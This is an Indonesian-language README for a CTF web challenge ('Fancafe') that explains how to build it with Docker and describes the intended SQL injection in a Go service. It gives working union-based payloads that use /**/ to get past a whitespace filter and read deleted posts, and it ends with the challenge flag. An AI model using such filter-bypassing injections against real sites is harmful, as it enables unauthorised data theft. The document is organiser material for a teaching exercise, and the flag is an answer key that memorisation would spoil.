# Fancafe [Medium]

## File yang diberikan ke peserta
Jalankan `./zip.sh`, lalu upload file `fancafe.zip`.

## Build
1. Copy file [`env.sample`](env.sample) menjadi `.env`.
2. Pada file `.env`:
    - Edit `PORT` menjadi port yang yang ingin di-forward ke host.
    - Edit `DATABASE_PASS` menjadi random string (jalankan `head /dev/urandom | sha256sum`).
3. Jalankan `docker-compose build`
4. Jalankan `docker-compose up` atau sebagai daemon `docker-compose up -d`.

## Vulnerability
Terdapat SQL injection vulnerability pada file [service/post.go](service/post.go). Akan tetapi, `keyword` hanya diperbolehkan sampai whitespace pertama sehingga payload tidak diperbolehkan adanya whitespace. Kita dapat mengakalinya dengan mengganti whitespace pada payload menjadi `/**/`.

Untuk mengecek berhasilnya SQL injection, dapat digunakan payload berikut.
```
%'/**/union/**/select/**/0,0,'a','a'#
```

## Proof Of Concept
Masukkan payload berikut.
```
%'/**/union/**/select/**/0,0,'a',(select/**/content/**/from/**/posts/**/where/**/is_deleted=1)#
```

## Flag
`flag{SQLi_adalah_jalan_ninjaku`
